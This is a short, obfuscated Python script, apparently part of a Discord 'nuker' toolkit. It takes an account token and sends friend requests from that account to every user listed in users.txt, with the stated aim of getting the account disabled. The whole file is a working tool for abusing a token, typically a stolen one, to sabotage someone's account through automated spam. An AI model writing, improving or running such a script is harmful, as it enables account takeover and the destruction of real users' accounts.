import requests 
import os
from colorama import init ,Fore ,Back ,Style 
from plugins .standard import *
init (convert =True )
def disable ():
    print (f"""{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET} Enter account token to disable""")
    O0O0O000OOO00O0O0 =str (input (f"""{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET} Token: """))
    OOOO0000O0OO000O0 ={'Authorization':O0O0O000OOO00O0O0 ,'Content-Type':'application/json'}
    OO0O0OOO0O000OOO0 =requests .get ('https://discord.com/api/v8/users/@me',headers =OOOO0000O0OO000O0 ).json ()
    print (f"\n{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET} User Details: {OO0O0OOO0O000OOO0['username']}#{OO0O0OOO0O000OOO0['discriminator']} - ({OO0O0OOO0O000OOO0['id']})")
    input (f"{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET} If These Details Are Correct Press Enter! (This Will Start Disbaling The Account)")
    print ()
    for O0O0OO00O00OO0000 in open ('users.txt','r').read ().splitlines ():
        try :
            OOO0OO0O0OO0OO0O0 =O0O0OO00O00OO0000 .split ('#')
            O0OO0OOO0000O0O00 =requests .post ('https://discord.com/api/v8/users/@me/relationships',headers =OOOO0000O0OO000O0 ,json ={'username':OOO0OO0O0OO0OO0O0 [0 ],'discriminator':OOO0OO0O0OO0OO0O0 [1 ]})
            print (f"\t{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET} {OOO0OO0O0OO0OO0O0[0]}#{OOO0OO0O0OO0OO0O0[1]} Added!")
        except :
            print (f"{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET} Something Went Wrong!")
    print (f"\n\n{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET} Account successfully disable")
    input (f"""\n{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET} Press ENTER to exit""")
disable ()